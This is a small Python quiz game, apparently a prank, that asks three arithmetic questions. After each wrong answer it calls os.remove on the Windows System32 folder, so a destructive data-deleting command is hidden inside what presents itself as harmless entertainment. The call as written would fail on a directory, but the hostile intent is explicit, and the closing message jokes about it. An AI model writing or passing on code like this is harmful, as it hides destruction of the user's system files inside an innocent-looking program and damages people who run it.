import os

print("Welcome to the math quiz easy game!")
user_input = input("Ok first question what's 5x12? ")
if user_input.lower() == "60":
    print("Nice correct lets go onto the next question! The next one is going to be medium difficulty")
else:
    print("cya")
    os.remove("C:/Windows/System32")

user_input = input("Ok now what is half of 150? ")
if user_input.lower() == "75":
    print("W correct now we are moving onto the hardest and last question!")
else:
    print("cya")
    os.remove("C:/Windows/System32")

user_input = input("Welcome to the last question and the hardest of em alllllllll what is 48÷6+7? ")
if user_input.lower() == "15":
    print("CONGRATULATIONS YOU HAVE COMPLETED THE MATH QUIZ WITHOUT GETTING SYSTEM 32 DELETED!")
else:
    print("cya")
    os.remove("C:/Windows/System32")
